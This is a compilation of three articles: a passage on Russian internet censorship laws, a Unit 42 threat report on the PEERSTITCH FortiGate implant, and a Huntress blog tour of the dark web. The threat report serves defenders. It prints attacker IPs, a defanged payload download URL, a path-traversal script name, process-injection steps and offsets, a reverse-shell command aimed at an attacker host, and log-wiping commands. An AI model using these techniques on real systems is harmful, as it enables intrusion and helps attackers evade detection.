In 2012, following the largest protests in Russia since the fall of the Soviet Union, the Kremlin passed law No. 139-FZ, titled “On Introducing Amendments to the Law on Protection of Children from Information Harmful to Their Health and Development,” which created the Unified Register of Banned Websites. This introduced internet service provider (ISP)-level technical infrastructure, enabling the Russian government to block domains and IP addresses through domain name system (DNS) tampering.In 2014, the Kremlin passed the Lugovoy Law (No. 398-FZ), allowing for extrajudicial blocking of websites the government considered “extreme” or which called for unauthorized protests.

Platform Takeovers by the Kremlin

The Russian Government started taking over platforms it considered politically threatening. For example, VKontakte founder Pavel Durov was forced out of Russia in 2014 after refusing to hand over data to the Federal Security Service (FSB). The Kremlin facilitated the transfer of control of VK to state-aligned businessmen, including Vladimir Kiriyenko, who is currently VK's CEO.

Data Localization Targeting Foreign Internet Companies

In 2014, the Russian government passed the Data Localization Law (No. 242-FZ), mandating that foreign internet companies store Russian citizens’ personal data on physical servers inside Russia, likely to make it easier for the Kremlin to access that data for surveillance purposes.

2016–2021: Surveillance Mandates and Attempts to Block Platforms

Laws Passed to Mandate Data Sharing, Restrict VPNs, and Pursue Sovereign Internet

In 2016, the Kremlin passed the Yarovaya Law (No. 374-FZ and No. 375-FZ), which forced ISPs and communication providers to retain metadata for up to three years and message and audio content for six months, and to provide that information to Russian security services without a warrant.In 2017, the Kremlin passed the Anonymizers Law (No. 276-FZ), formally prohibiting the use of VPNs to circumvent blocked websites.In 2019, the Kremlin passed the Sovereign Internet Law (No. 90-FZ), which required Russian ISPs to install TSPU (technical means of counteracting threats, технические средства противодействия угрозам) controlled by Roskomnadzor, thereby giving the state the power to throttle or sever external traffic to a platform.

Attempts to Block Platforms Have Mixed Results

In 2018, Roskomnadzor attempted to block Telegram by IP-banning millions of cloud servers. The attempt failed, disrupting banking and retail systems without shutting down Telegram.In 2021, the Kremlin launched its first large-scale deployment of TSPU –– deep packet inspection (DPI) hardware –– to throttle a mainstream social media platform, thereby demonstrating technical maturity in the Kremlin’s ability to throttle platforms.

2022–2024: Crackdown on Independent Media, VPN Blocks

Mass Blocking and Shutdown of Independent Media

Following Russia’s full-scale invasion of Ukraine, the Kremlin blocked hundreds of independent news outlets (including Meduza, BBC, Radio Free Europe, and Ekho Moskvy) by pushing DNS and SNI (Server Name Indication)-level blocks to TSPU devices across all ISPs simultaneously. In addition, the Kremlin throttled, before outright blocking access to, social media platforms such as Facebook and Instagram. This was accomplished via TSPU's packet-dropping mechanism before full blocks were applied in March 2022.

In 2024, Roskomnadzor began throttling YouTube to near-unusable levels, likely to force users onto state-controlled video platforms.

Anti-VPN Actions

In 2023–2024, Roskomnadzor began blocking underlying VPN protocols, including OpenVPN, WireGuard, and Shadowsocks, via DPI hardware.

In 2024, the VPN Advertising Ban (No. 406-FZ) took effect, prohibiting the advertising of VPNs and other tools that circumvent blocks on certain websites and platforms.

Title: Unit 42 Uncovers PEERSTITCH, a Stealthy FortiGate Implant
Context: The attackers behind CL-STA-0954 achieved an initial compromise by exploiting CVE-2024-47575 against a centralized FortiManager appliance
Full Text:
Executive Summary

Unit 42 investigated a multi-stage network intrusion against a telecommunications organization that occurred in September 2024, which we are tracking as cluster CL-STA-0954 (aka UNC5820). The attackers behind CL-STA-0954 achieved an initial compromise by exploiting CVE-2024-47575 against a centralized FortiManager appliance.

From that single appliance, our observations are that the attackers exfiltrated an archive containing running configurations, cryptographic material and database files containing information about more than 500 managed FortiGate firewalls. Those firewalls protected the target's own infrastructure and the networks of its clients.

Following the initial compromise, the attackers behind CL-STA-0954 demonstrated a complex level of tradecraft. Aspects of the post-exploitation activity overlap with intrusions attributed to suspected nation-state actors. Armed with the stolen information, the attackers:

Maintained long-term access

Intercepted network traffic

Established VPN sessions

Deployed backdoors

Exploited a separate privilege-escalation vulnerability

The attackers exploited another vulnerability, CVE-2025-61624, via FortiOS auto-script path traversal. This exploit facilitated the deployment of PEERSTITCH, a novel, memory-resident ARM64 malware.

PEERSTITCH leaves no persistent binary on disk, opens no listening ports and initiates no outbound network connections. Instead, it communicates through traffic generated by legitimate processes on the infected host, which makes the malware resistant to conventional endpoint and network detection.

The attackers also impersonated the FortiManager platform to pull from managed firewalls of other hosts in the targeted network.

Overview of the Intrusion

We investigated a prolonged network intrusion against a telecommunications managed service provider. The attackers demonstrated proficiency in Fortinet appliance architecture, FortiOS internals and FortiOS management protocols.

Our investigation spanned the provider's own environment. We did not examine the client networks whose firewalls the provider managed. The exposure described in this report is of configuration and credential material rather than confirmed intrusion into those networks. Figure 1 below shows a flowchart illustrating an overview of the intrusion.

Initial Access and Network Configuration Theft (CVE-2024-47575)

During the initial phase of the intrusion, the attackers exploited CVE-2024-47575 (referred to by external parties as FortiJump). The vulnerability allows an unauthenticated remote attacker to execute arbitrary commands via crafted requests to the FMG-Access (TCP port 541) management channel.

During the exploitation, the attackers registered a rogue Virtual FortiGate appliance named localhost (serial number FMG-VMTM23017412) to the central FortiManager instance, originating from external attacker infrastructure (45.32.41[.]202, later modified to 198.199.122[.]22).

Immediately following device registration, the attacker generated a configuration archive named .tm in the FortiManager file system, which they exfiltrated shortly thereafter. Analysis of this artifact revealed:

The FortiManager appliance's own serial number and its management relationships to every enrolled device

Complete running configuration files for more than 500 managed FortiGate firewalls across internal infrastructure and client networks

Central management SQLite databases: global.db (containing administrative domains, global objects and policy packages) and revinfo.db (containing device revision metadata)

A flat text inventory listing more than 500 FortiGate serial numbers alongside their respective public IP addresses

Internal network topology maps, routing tables and interface configurations

Ciphertext administrative, local and SSL/VPN credentials

Encoded cryptographic trust material, including public certificates and private keys

Credential Decryption and Initial Re-Entry

The exfiltrated FortiGate configurations contained sensitive credentials stored as reversible ciphertext. We confirmed that the credentials were recoverable by successfully brute-forcing administrative and SSL/VPN passwords from the exfiltrated configuration files.

Using legitimate credentials, the attackers established unauthorized FortiGate SSL/VPN sessions to perimeter firewalls from known external staging infrastructure (23.240.77[.]233 and 47.18.167[.]159). These sessions granted the attackers authenticated access into internal network-management segments.

Privilege Escalation: CVE-2025-61624

During the intrusion, the attackers exploited CVE-2025-61624 to escalate from FortiOS administrative access to root on the underlying firewall operating system. A FortiOS administrator, including a super_admin, operates within a restricted management command line with no shell access and no direct control over the appliance file system or its running processes. The daemons that implement FortiOS run as root beneath that interface.

The vulnerability allows an authenticated administrative account to read and write arbitrary files as root via path traversal in the FortiOS CLI system.auto-script engine. The auto-script object name is not sanitized, allowing a name containing traversal sequences to place the script body outside the intended directory, at any file system location. The script executes with the privileges of the auto-script engine.

Technical Analysis of the PEERSTITCH Implant

PEERSTITCH is a 64-bit Linux ARM64 executable written in C and statically linked against glibc. It acts as a one-shot process memory patching injector targeting two core FortiOS daemons:

/bin/miglogd: The central system and traffic logging daemon

/bin/iked: The IKE/IPsec VPN service daemon handling cryptographic negotiation

Figure 3 shows a flow chart of PEERSTITCH activity, which we will examine in greater detail.

Delivery and Staging Chain

1). Downloader initialization: Exploiting CVE-2025-61624, the attackers pushed ../../../../setup to a select number of firewalls

2). Payload retrieval: The script downloaded five files from hxxp[:]//23.240.77[.]233:8085/ into /data2/template/:

pM.js: Environment preparation script (self-deleting)

a.js (saved as index.js): Emscripten JavaScript runtime module

a.wasm (saved as index.wasm): Compiled WebAssembly binary module

b.js (saved as ipssem.js): Deployment orchestrator script

dd (saved as lldprx): Native ARM64 ELF binary injector (PEERSTITCH core)

3). Execution: Following an execution delay, ipssem.js launched lldprx with arguments lldprx!index.js!index.wasm!ipssem.js!lldprx!yyyy!pM.js

Injector Execution and Process Parasitization

The lldprx binary performs a single-pass execution sequence:

Process discovery: Iterates through /proc/, parses /proc/<pid>/cmdline and locates the process identifiers (PIDs) for /bin/miglogd and /bin/iked

Memory layout enumeration: Reads /proc/<pid>/maps to extract the base addresses and memory boundaries of both target daemons

Process attachment: Attaches to both running processes using ptrace(PTRACE_SEIZE, pid) and halts execution via PTRACE_INTERRUPT

Register state capture: Calls ptrace(PTRACE_GETREGSET, pid) to snapshot all ARM64 general-purpose registers (X0 through X30), the stack pointer (SP) and program counter (PC)

Dynamic shellcode construction: Generates an ARM64 bootstrap stub dynamically. The bootstrap executes an mmap syscall (X8 = 0xDE) requesting 0x4000 (16,384 bytes) of PROT_READ | PROT_WRITE | PROT_EXEC (RWX) memory mapped as MAP_PRIVATE | MAP_ANONYMOUS

Payload injection: Writes a 1,344-byte injection payload into the newly allocated RWX buffer via /proc/<pid>/mem

Covert IPC and Cross-Daemon Memory Sharing

Instead of using network sockets or disk files, PEERSTITCH creates a covert, memory-resident communication bridge between /bin/miglogd and /bin/iked.

Figure 4 shows a flowchart for PEERSTITCH network traffic.

Passive traffic monitoring: Inside both daemons, the hook code inspects data already passing through the process without redirecting packets. It evaluates string patterns using strstr() for two specific markers:

TCP port marker: 8550 (embedded within traffic data, not a listening port)

IP address marker: 169.254.0.1 (link-local identifier used for pattern matching)

Tag extraction and buffering: When a marker is identified, the hook extracts an associated session token or identifier (up to 31 bytes) and writes it into a 16-slot circular ring buffer at offset +0x0F0

Cross-process write: The hook iterates through its forwarding table at offset +0x400 (populated with the counterpart daemon's PID and buffer base address). It invokes open(), lseek() and write() on /proc/<counterpart_pid>/mem, writing the extracted tag directly into the other daemon's memory.

Conditional execution branching: When /bin/iked processes subsequent VPN sessions, its hook inspects its injection buffer. If a corresponding tag exists, the hook takes an alternate return branch (ADRP return path), bypassing default FortiOS security validations.

Memory Patching and Branch Path Modification

To suppress tamper detection and alter default daemon routines, PEERSTITCH applies direct NOP patches (0xAA0003E0, corresponding to MOV X0, X0 on ARM64) to three static offsets within target process memory:

base + 0x106F7B8

base + 0x1072E20

base + 0x109A570

A 20-byte trampoline patch is written to base + 0x135102C to redirect standard execution into the allocated RWX hook buffer. Figure 5 shows a visual memory layout of the 16 KB buffer used by the ARM64 PEERSTITCH payload.

Apache mod_md ACME Reverse Shell Command and Control

Alongside PEERSTITCH, the attackers established a command and control channel by weaponizing the native Apache mod_md (Managing Domains) module on FortiGate firewalls. This module uses the Automated Certificate Management Environment (ACME) protocol.

The attackers pushed an auto-script object to create ../../tmp/apache2/conf/md-acme.conf, as shown below in Figure 6.

Weaponization Mechanics

1). Rogue certificate authority initialization: The account.json state file demonstrates the initial registration with the attacker's ACME server, explicitly routing ACME directory requests to external infrastructure

2). Challenge orchestration: The order.json file outlines the pending certificate order, mapping the authorization and finalization URLs directly to the attacker's server

3). Command execution via DNS-01 challenge: MDChallengeDns01 was mapped directly to /bin/node. When Apache initiates a certificate validation challenge, it executes Node.js with parameters retrieved from the remote ACME server. The job.json debug log reveals how the attackers exploited this by injecting shell commands (kali@23.240.77[.]233:8084:b -F /tmp/upfile/ssh_config -i) directly into the domain name field of the challenge request, initiating an SSH-based reverse shell.

4). Continuous polling loop: Setting MDRenewMode always forced the Apache daemon to continuously trigger these malicious renewal challenges. Because the DNS-01 challenge was mapped to /bin/node, this polling cycle ensured the continuous re-execution of the injected payload, establishing a persistent outbound reverse-shell communication channel.

Management Impersonation and FortiGate to FortiManager Chained Exploitation

FortiGate to FortiManager (FGFM) communications occur over TCP port 541 using cryptographic trust material requested and validated against appliance serial numbers. The archive exfiltrated during the initial FortiJump compromise contained this material, along with the serial numbers and management relationships of every downstream device.

Following FGFM interactions from external infrastructure over TCP port 541, an administrative account named FortiGateCloud downloaded complete running configurations from multiple managed firewalls. The victim organization operated no FortiManager Cloud tenant, and no such account was provisioned on the affected devices.

We assess with a medium degree of confidence that the attackers issued these commands by impersonating the management platform over FGFM. Two paths were available to them, and the evidence does not distinguish between them:

Exploitation of CVE-2024-26009 to bypass FGFM authentication using the FortiManager's serial number

Direct reuse of the exfiltrated trust material to authenticate as the legitimate FortiManager

Asserting a management identity requires terminating the authentic FortiManager's session. It is possible that the attackers forced this session termination using CVE-2024-26008, consistent with the intermittent tunnel management interface drops described in the Anti-Forensics and Defense Evasion section below.

We are aware of other vulnerabilities in which the FortiGateCloud account has been misused to perform unauthorized actions, including:

CVE-2025-59718

CVE-2025-59719

The related single sign-on (SSO) issues tracked under FG-IR-26-060

Each of these vulnerabilities requires the device to be enrolled in FortiGate Cloud/FortiCloud SSO, and the affected firewalls held no such enrollment. We exclude these vulnerabilities from scope for this intrusion. We note that the observed activity reused only the account name and none of the exploitation artifacts associated with those issues.

Anti-Forensics and Defense Evasion

The attackers took extensive measures to eliminate forensic artifacts:

Service termination: Executed killall -9 miglogd and killall -9 syslogd to halt local and remote syslog generation prior to executing malicious auto-scripts

Crash log clearing: Issued FortiOS diagnostic command diagnose debug crashlog clear to wipe segmentation fault logs generated during initial memory injection attempts

Configuration rollback: Automatically deleted rogue administrator accounts, rogue VPN groups and auto-script objects (../../../../setup) shortly after execution

Decoy artifact creation: Overwrote /tmp/apache2/conf/md-acme.conf with a common string found in this file (#0 certs managed by ACME\n\n\n) to mask reverse-shell configuration files

Process memory self-deletion: lldprx unlinked its own binary from disk and scanned /proc/ to terminate the staging setup process before exiting

Logging telemetry disruption: Log telemetry showed intermittent drops across the tunnel management interface during periods of malicious activity. We assess with medium confidence that the attackers deliberately induced this degradation to suppress real-time telemetry to central management consoles. This is consistent with the previously described pattern of telemetry suppression, including terminating miglogd and syslogd, clearing crash logs, and rolling back configuration objects. It’s possible that the attackers forced the disconnects using CVE-2024-26008 over TCP port 541. Available logs do not capture the triggered traffic, so we could not confirm the mechanism.

Conclusion

This intrusion highlights a growing threat, the weaponization of centralized edge management ecosystems to compromise downstream networks. One compromised appliance yielded the cryptographic keys, credentials and network topology for more than 500 firewalls, including devices protecting client organizations.

The discovery of the PEERSTITCH implant demonstrates the increasing technical maturity of edge-device malware. By operating as a one-shot injector, avoiding persistent disk artifacts and building a covert inter-process communication bridge inside process memory, the attackers achieved sustained persistence while evading traditional monitoring.

For organizations that manage infrastructure on behalf of others, the management platform is the highest-value target on the network. Compromising the management platform is not contained by the boundary of the organization that owns it. That compromise also does not end when the platform is patched.

The cryptographic trust material governing the platform's relationship with every managed device leaves with the attacker and remains valid until it is rotated. Defenders must treat edge management interfaces with the highest level of zero trust isolation. They must also treat the credentials and certificates those interfaces hold as compromised the moment the platform is.

Title: What Does the Dark Web Look Like? Pulling Back the Curtain | Huntress
Context: Avoid downloads and scripts: Avoid downloading unknown files, especially on the dark web, and disable scripts like JavaScript in Tor's settings—they can be exploited to reveal...
Full Text:
In today’s always-connected world, the line between dark and light is blurring.

Well, actually, you’re still protected from finding out what the dark web looks like because you need to download a special browser to access it. But the drama of the dark web can be intriguing. And it’s not all wicked criminal activity either.

Curious about what’s lurking in the shadows of the internet? Keep reading to learn more about the state of the dark web, what it is, and how to access it (safely, of course!).

What is the dark web?

Everyone has their own preconceived notion of what the dark web is. (Of course, with a name as ominous as dark web, it kind of sets the mood, right?) For the sake of this blog, we focused on finding a credible definition that isn’t muddied with preconceptions.

The dark web is a hidden part of the internet that you can only reach with special tools. Merriam-Webster describes it as a set of sites that search engines don't index and that regular browsers can't open. Reaching them takes specialized software or a specific network setup, and encryption keeps both site owners and visitors anonymous.

(If you were expecting a more sinister-sounding definition for the term dark web, you’re not alone. 😅)

The web, as a whole, can be divided into three parts: the surface web vs. deep web vs. dark web:

Dark web: This is where things get…different. As we said, dark web activity isn't indexed and requires special software or network configuration to access. While it can be a place where people broker illegal activities, it can also be used for legal activities, like anonymously sourcing information.

Surface web: The surface web is everything that’s automatically indexed by search engines. It’s everything that pops up when you Google something (or Bing or whatever search engine), and you don’t need any sort of special software or login to access it.

Deep web: The deep web is sites that are not indexed, but are accessible to the average person, usually through encryption or password protection (or both, both is good!). This includes things like online banking and cloud storage.

What does the dark web look like?

The dark web often looks surprisingly ordinary—with familiar features like About Us sections, pricing pages, and even customer reviews. You’ll see, though, in the screenshots below, that a lot of sites are basic or outdated, often tricky to navigate.

Many of these sites still work like any other ecommerce website. Threat actors advertise, highlight their skills, and market themselves, their expertise, and their services just like any salesperson.

How does the dark web work?

Frankly, the dark web has earned a bad reputation—and unfairly so. At its core, the dark web isn’t inherently evil or mysterious. (Okay, it's a little mysterious.)

It’s simply a collection of websites that require a specific, anonymity-powered web browser to access. Usually, these sites use a .onion domain and are only accessed through the anonymous Tor Browser.

The dark web isn't all crime and chaos—detectives and journalists sometimes access the dark web to do research while maintaining their anonymity. You can play chess on the dark web. At one point in time, you could even navigate to a Tor website and watch a slideshow of cats and kittens submitted by other users.

The dark web isn't any one thing—it's shaped entirely by how people choose to use it.

How to safely access the dark web

Because there are so many different reasons that you might be interested in the dark web, it’s important to know how to access it safely. Here are some tips:

Use a dark web browser: Use the official Tor browser to access the dark web. This is the essential tool for "onion routing" that provides anonymity.

Use a VPN: While Tor provides encryption, using a high-quality virtual private network (VPN) before launching adds an extra layer of privacy by hiding the fact that you are even connecting to the Tor network from your internet service provider (ISP).

Never use personal information: Don’t log into any personal accounts—email, social media, or bank accounts—while using Tor because it immediately de-anonymizes you.

Avoid downloads and scripts: Avoid downloading unknown files, especially on the dark web, and disable scripts like JavaScript in Tor's settings—they can be exploited to reveal your identity or install malware.

Know what’s legal: Accessing the dark web is completely legal in the US, but engaging in illegal activities (such as buying/selling drugs, weapons, or accessing child pornography) is a serious felony, regardless of anonymity.

Our journey into the dark web

We’re firm believers in the buddy system when it comes to doing scary things like journeying through the dark web. Don't worry, though— we’ve suited up, strapped on our protective gear, and done the risky part for you.

How did we suit up?

First, we booted up our virtual machine (VM) to add an extra layer of security while browsing. Then, we fired up our anonymous Tor Browser. Finally, we disabled JavaScript—a quick but important safeguard against websites that run malicious code.

With these precautions in place, we were ready to access the dark web. We began our journey by navigating to a few .onion directories to find some ~shady~ websites to peruse.

One of the first things we found? A Tor scam list, complete with "safe" browsing recommendations. How… thoughtful.

Who is using the dark web?

There are About Us pages to answer that question.

Chances are, you wouldn’t hire a plumber without doing some research. You’d want to make sure she’s got the experience and skills to leave your pipes in better shape than she found them. So why would anyone hire a hacker without seeing a well-written About Us page?

You might think this requirement would narrow the pool of hackers to choose from, because are hackers really spending their time writing About Us pages? Yes. Yes, they are.

You’ve got to hand it to them: These hackers did a great job at flexing their hacking skills while staying anonymous. It's not exactly LinkedIn, but the info they share gives these folks some credibility (in a strange way).

If you’ve never browsed the dark web before, you probably weren’t expecting to see several websites with About Us pages. It’s eye-opening to see these hackers flaunting their skills and competing with one another to earn new business.

One site was even gracious enough to list the team’s favorite well-known hackers:

It’s kind of sweet, in a weird sort of way.

The takeaway: Threat actors are just like any other entrepreneurs out to make a profit. The difference? They skip the red tape and regulations that everyone else has to follow. This leaves the door wide open for them to advertise whatever services they please—as long as they abide by the Hacker’s Code of Conduct. (More on that later.)

What’s on the dark web?

Product pages, packaged deals, and more.

Now that we know our threat actors, let’s investigate what they can do for us.

Like any good businessperson, hackers aren’t shy about broadcasting what they can do if the price is right. In fact, some are so business-savvy that they provide packages and tiered solutions:

Others simply prefer to put all their services out there for people to pick and choose from:

But then, we stumbled across two different websites that made us raise an eyebrow. Here’s the first site:

And here's the second site:

These two sites look eerily similar to each other except for one thing: on the latter site, the prices for each service are noticeably higher. That’s weird, wouldn’t you say?

The takeaway: Just like any other website where you can purchase products or services, threat actors also have tiered options, promotional packages, and detailed descriptions of their offerings.

One key difference that seems to be standard across dark web websites is that hackers request that their payments be made in cryptocurrencies. Why? Because it’s anonymous.

Our Principal Security Researcher, John Hammond, nicely sums up why cryptocurrencies are a hacker’s best friend:

"No other technology offers a bad actor the perfect crime: anonymous threats without borders, blackmail and extortion without a financial oversight or governing authority. [...] Unless the bad actors make any unintentional mistake, the inherent design of cryptocurrency makes for a perfect getaway car."

Dark web customer experience and reviews

Threat actors are actually quite concerned with creating a positive customer experience, with features like customer reviews and FAQ on many of the pages we visited.

The takeaway: Just like any other website selling goods and services, threat actors also want to show that they have happy customers and give potential customers all the info they need to make an informed purchase.

Bottom line: The dark web is a business

If a business owner feels she’s been wronged, there are courts for that. The same can be said for hackers. That’s right—threat actors have their very own court system, along with codes of conduct to follow to minimize the chances of landing there themselves.

What happens in “hacker’s court”? The same thing that happens in any other court: Plaintiffs and defendants get together to tell their respective stories in front of a jury before a ruling is made.

We can't stress this enough: Most bad actors today don’t just hack into websites and devices for the fun of it. These are professionals who become experts in their trade and master their skills to earn a paycheck.

They build websites to sell their services, cut their customers special deals, and ask for reviews from satisfied customers. If they’re wronged, they handle it in a civilized manner in hacker’s court. These are organized operations that function just like any other business.

Don’t be afraid of the dark (web)

We hope that this field trip to the dark web has been enlightening. It’s incredible to see just how many parallels exist between anyone with a “normal” day job and dark web threat actors. Many different careers, from marketing and sales to cybersecurity and infosec, have dark-mirror versions of themselves—hackers and scammers running the same playbooks in reverse—on the dark web.

If nothing else, we hope this blog will make you more vigilant against cyberattacks. Hackers are in it for the money. What could destroy your personal records or your business’s reputation is just another payday for a hacker. Think twice before clicking on an email from an unfamiliar sender. Keep your devices updated and install patches as soon as they become available.

Threats can seem overwhelming, but with our in-depth understanding of how threat actors think, we know what to look for. Huntress gives you fully managed endpoint detection and response (EDR), so you've got 24/7 support from security experts ready to respond to threats.

* Special thanks to our Principal Security Researcher, John Hammond, for his help with writing this blog.

FAQ

Is it legal to look at the dark web?

Yes, exploring the dark web is legal—as long as you aren’t breaking any laws. If you’re just browsing or doing legitimate research, accessing the dark web is fine. If you engage in any criminal act, you’ll be subject to prosecution.

What is the dark web actually used for?

The dark web is a mixed bag. Some people use it for both legitimate purposes, like preserving privacy and free speech, especially in restrictive countries, and, unfortunately, others for shady activities like selling stolen data or illegal goods.

How do I know if I’m on the dark web?

If you're using a specialized browser like Tor to access websites ending with .onion that aren't reachable through regular browsers or search engines, congrats (or maybe not)—you're on the dark web!

Can you be tracked on the dark web?

The dark web offers more anonymity, but it's not exactly an invisibility cloak. With sophisticated methods and one careless click, determined parties can still track your activities, so anonymity isn't guaranteed.

What is a crime on the dark web?

Crimes on the dark web include activities like selling illegal substances, hacking services, and trafficking stolen data. Basically, if it's illegal in the real world, it's illegal on the dark web too—no free passes.
